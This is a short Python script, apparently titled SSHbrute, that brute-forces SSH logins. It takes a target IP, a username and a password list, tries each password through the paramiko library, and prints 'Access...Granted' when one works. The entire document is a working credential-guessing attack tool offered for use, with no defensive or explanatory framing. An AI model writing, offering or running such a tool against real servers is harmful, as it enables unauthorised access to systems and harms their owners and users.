#!/usr/bin/python
import paramiko
import socket
import re
import sys

def usage():

	print " ____        _         _   _      ____  "
	print "| __ )  ___ | | ___ __| \ | |_ __| __ ) "
	print "|  _ \ / _ \| |/ / '__|  \| | '__|  _ \ "
	print "| |_) | (_) |   <| |  | |\  | |  | |_) |"
	print "|____/ \___/|_|\_\_|  |_| \_|_|  |____/ "
	print " "
	print " Usage()"	
	print "python SSHbrute.py [IP] [username] [password list]"
	sys.exit()

def main():
	if not len(sys.argv[2:]):
		usage()
	else:
		sshfunction()
	sys.exit()

def sshfunction():
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	f=open(sys.argv[3])
	for line in f.readlines():
		senha = line.split()
		try: 
			ssh.connect(sys.argv[1], username=sys.argv[2], password=senha[0])
		except paramiko.AuthenticationException:
			print "[-] Trying: %s SSH Access Denied" %(line)
		else: 
			print "[!] SSH Access...Granted: ",line
			break
	ssh.close()
	sys.exit()
main()
